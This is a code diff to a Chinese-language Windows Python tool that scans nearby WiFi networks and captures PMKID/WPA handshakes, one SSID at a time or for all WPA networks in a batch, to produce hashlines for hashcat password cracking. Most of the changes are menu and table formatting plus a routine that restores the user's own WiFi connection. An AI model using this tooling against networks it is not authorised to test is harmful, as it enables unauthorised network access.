@@ -634,11 +634,17 @@ def capture_scapy(ssid: str, bssid: str) -> CaptureResult:
 # ============================================================================
 def main():
     print()
-    print("  ╔══════════════════════════════════════════════════╗")
-    print("  ║     WiFi握手包捕获工具 v1.0 (Windows)           ║")
-    print("  ║     扫描WiFi → 选择目标 → 捕获PMKID/握手包     ║")
-    print("  ║     输出.22000 hashline用于hashcat GPU破解      ║")
-    print("  ╚══════════════════════════════════════════════════╝")
+    print("  ╔══════════════════════════════════════════════════════╗")
+    print("  ║                                                      ║")
+    print("  ║   🔓  WiFi 握手包捕获工具 v3.2  (Windows)           ║")
+    print("  ║                                                      ║")
+    print("  ║   扫描WiFi → 选择目标 → 捕获PMKID/握手包           ║")
+    print("  ║   输出 .22000 hashline → hashcat GPU破解            ║")
+    print("  ║                                                      ║")
+    print("  ║   ✓ 自动检测WiFi网卡     ✓ GBK/UTF-8编码兼容      ║")
+    print("  ║   ✓ hashline有效性验证   ✓ 捕获后自动恢复WiFi      ║")
+    print("  ║                                                      ║")
+    print("  ╚══════════════════════════════════════════════════════╝")
     print()
 
     # 检查管理员权限
@@ -658,14 +664,17 @@ def main():
         print()
 
     while True:
-        print("  ┌─────────────────────────────┐")
-        print("  │  1. 扫描附近WiFi            │")
-        print("  │  2. 捕获指定SSID的握手包    │")
-        print("  │  3. 批量捕获所有WiFi        │")
-        print("  │  4. 查看已捕获的hashline    │")
-        print("  │  0. 退出                    │")
-        print("  └─────────────────────────────┘")
-        choice = input("\n  请选择: ").strip()
+        print()
+        print("  ╭───────────────────────────────╮")
+        print("  │       主 菜 单                │")
+        print("  ├───────────────────────────────┤")
+        print("  │  1 │ 📡 扫描附近WiFi          │")
+        print("  │  2 │ 🎯 捕获指定SSID握手包    │")
+        print("  │  3 │ 🔄 批量捕获所有WPA网络   │")
+        print("  │  4 │ 📂 查看已捕获的hashline  │")
+        print("  │  0 │ 🚪 退出                  │")
+        print("  ╰───────────────────────────────╯")
+        choice = input("\n  请选择 [0-4]: ").strip()
 
         if choice == '0' or choice.lower() == 'q':
             print("\n  再见!")
@@ -673,16 +682,21 @@ def main():
 
         elif choice == '1':
             # 扫描WiFi
-            print("\n  [*] 扫描中...")
+            print("\n  📡 扫描附近WiFi网络...")
             networks = scan_wifi()
             if not networks:
-                print("  [!] 未扫描到WiFi网络")
+                print("  ⚠ 未扫描到WiFi网络")
                 continue
             print(f"\n  扫描到 {len(networks)} 个WiFi网络:\n")
-            print(f"  {'#':>4s}  {'SSID':<28s}  {'信号':>4s}  {'安全类型':<16s}  {'BSSID':<19s}  {'频道':>4s}")
-            print(f"  {'─'*4}  {'─'*28}  {'─'*4}  {'─'*16}  {'─'*19}  {'─'*4}")
+            print(f"  ┌{'─'*4}┬{'─'*28}┬{'─'*6}┬{'─'*18}┬{'─'*19}┬{'─'*5}┐")
+            print(f"  │{'#':^4s}│{'SSID':^28s}│{'信号':^4s}│{'安全类型':^14s}│{'BSSID':^19s}│{'频道':^3s}│")
+            print(f"  ├{'─'*4}┼{'─'*28}┼{'─'*6}┼{'─'*18}┼{'─'*19}┼{'─'*5}┤")
             for i, n in enumerate(networks):
-                print(f"  {i+1:>4d}  {n.ssid:<28s}  {n.signal:>3d}%  {n.security:<16s}  {n.bssid:<19s}  {n.channel:>4d}")
+                sig = f"{n.signal}%" if n.signal else '?'
+                sec = n.security[:16] if n.security else '?'
+                ch = str(n.channel) if n.channel else '?'
+                print(f"  │{i+1:>3d} │ {n.ssid:<26s} │{sig:>5s} │ {sec:<16s} │ {n.bssid:<17s} │{ch:>4s} │")
+            print(f"  └{'─'*4}┴{'─'*28}┴{'─'*6}┴{'─'*18}┴{'─'*19}┴{'─'*5}┘")
 
             # 选择目标
             print()
@@ -766,25 +780,67 @@ def main():
         else:
             print("  [!] 无效选择")
 
+# ============================================================================
+# WiFi连接保存与恢复
+# ============================================================================
+def get_current_ssid() -> str:
+    """获取当前连接的WiFi SSID"""
+    out = _run_cmd(['netsh', 'wlan', 'show', 'interfaces'])
+    for line in out.split('\n'):
+        upper = line.strip().upper()
+        if 'SSID' in upper and 'BSSID' not in upper:
+            val = line.strip().split(':', 1)[-1].strip() if ':' in line else ''
+            if val and val != upper:  # 排除标题行
+                return val
+    return ''
+
+def restore_wifi(ssid: str):
+    """恢复到之前的WiFi连接"""
+    if not ssid:
+        return
+    print(f"\n  🔄 恢复WiFi连接: {ssid}")
+    # 先尝试用已保存的profile重连
+    subprocess.run(['netsh', 'wlan', 'connect', f'name={ssid}'],
+                  capture_output=True, timeout=10)
+    time.sleep(3)
+    # 验证是否恢复成功
+    current = get_current_ssid()
+    if current == ssid:
+        print(f"  ✓ 已恢复到 {ssid}")
+    else:
+        print(f"  ⚠ 恢复失败（当前: {current or '未连接'}），请手动连接")
+
 def capture_one(ssid: str, bssid: str) -> CaptureResult:
-    """捕获单个目标：先尝试netsh trace，失败则尝试Scapy"""
+    """捕获单个目标：保存当前WiFi → 捕获 → 自动恢复"""
+    # 记录当前WiFi用于恢复
+    original_ssid = get_current_ssid()
+    if original_ssid:
+        print(f"    📶 当前WiFi: {original_ssid}（完成后自动恢复）")
+
+    result = None
     # 方式A: netsh trace（纯Windows原生）
-    print("    [方式A] netsh trace ETW捕获...")
+    print("    ┌── 方式A: netsh trace ETW ──┐")
     r = capture_netsh(ssid, bssid)
     if r.success:
-        print(f"    [+] 捕获成功! 方式={r.method}")
-        return r
-    print(f"    [-] 方式A: {r.error}")
+        print(f"    └── ✓ 捕获成功 ({r.method}) ──┘")
+        result = r
+    else:
+        print(f"    └── ✗ {r.error[:50]} ──┘")
+        # 方式B: Scapy + Npcap
+        print("    ┌── 方式B: Scapy + Npcap ──┐")
+        r = capture_scapy(ssid, bssid)
+        if r.success:
+            print(f"    └── ✓ 捕获成功 ({r.method}) ──┘")
+            result = r
+        else:
+            print(f"    └── ✗ {r.error[:50]} ──┘")
+            result = CaptureResult(error="两种方式均失败")
 
-    # 方式B: Scapy + Npcap（需要第三方库）
-    print("    [方式B] Scapy + Npcap捕获...")
-    r = capture_scapy(ssid, bssid)
-    if r.success:
-        print(f"    [+] 捕获成功! 方式={r.method}")
-        return r
-    print(f"    [-] 方式B: {r.error}")
+    # 自动恢复WiFi
+    if original_ssid:
+        restore_wifi(original_ssid)
 
-    return CaptureResult(error=f"两种方式均失败")
+    return result
 
 def show_results(results: list):
     """美化结果展示 + hashline有效性验证"""
